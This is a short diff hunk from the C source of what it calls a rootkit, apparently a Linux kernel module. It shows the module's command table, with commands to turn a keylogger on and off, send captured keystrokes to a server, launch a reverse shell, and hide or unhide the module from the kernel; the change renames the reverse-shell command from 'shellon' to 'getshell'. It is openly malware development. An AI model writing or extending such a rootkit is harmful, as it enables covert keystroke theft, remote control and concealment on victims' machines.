@@ -37,7 +37,7 @@ static struct command rootkit_commands_array[] = {
 	{ "klgon", 6, "activate keylogger", 20, klgon_handler },
 	{ "klgoff", 7, "deactivate keylogger", 21, klgoff_handler },
 	{ "klg", 3, "send keylogger content to server", 35, klg_handler },
-	{ "shellon", 7, "launch reverse shell", 20, shellon_handler },
+	{ "getshell", 8, "launch reverse shell", 20, shellon_handler },
 	{ "killcom", 7, "exit the module", 16, killcom_handler },
 	{ "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
 	{ "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
